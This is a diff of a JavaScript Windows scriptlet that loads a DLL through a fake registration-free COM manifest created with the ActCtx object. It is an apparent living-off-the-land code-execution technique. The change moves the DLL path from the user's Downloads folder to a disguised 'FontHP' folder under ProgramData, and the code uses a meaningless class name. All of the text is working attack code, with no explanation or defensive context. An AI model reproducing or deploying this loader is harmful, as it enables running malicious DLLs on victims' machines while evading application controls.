@@ -2,12 +2,12 @@
 <scriptlet>
   <script language="JavaScript">
     <![CDATA[
-		var ManifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity type="win64" name="COM" version="1.0.0.0"/> <file name="SideManifest.dll"> <comClass description="HSNJDUJHAFKAJSFBF" clsid="{5e18b3dc-5174-481c-bd29-2d4a7ca7e8b5}" threadingModel="Both" progid="HSNJDUJHAFKAJSFBF"/></file></assembly>';
+		var ManifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity type="win64" name="COM" version="1.0.0.0"/> <file name="c:\ProgramData\FontHP"> <comClass description="HSNJDUJHAFKAJSFBF" clsid="{5e18b3dc-5174-481c-bd29-2d4a7ca7e8b5}" threadingModel="Both" progid="HSNJDUJHAFKAJSFBF"/></file></assembly>';
 		var ShellEnv = new ActiveXObject('WScript.Shell');
-		ShellEnv.Environment('Process')('TMP') = 'C:\\Users\\' + ShellEnv.Environment('Process')('username') + '\\Downloads';
+		ShellEnv.Environment('Process')('TMP') = 'c:\ProgramData\FontHP\Manifest.dll';
 		var ActCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
 		ActCtx.ManifestText = ManifestXML;
 		ActCtx.CreateObject("HSNJDUJHAFKAJSFBF"); // If you do not actually CreateObject the fake SxS assembly is never loaded via context
-    ]]>
-</script>
-</scriptlet>
+   ]]>
+</script> 
+</scriptlet> 
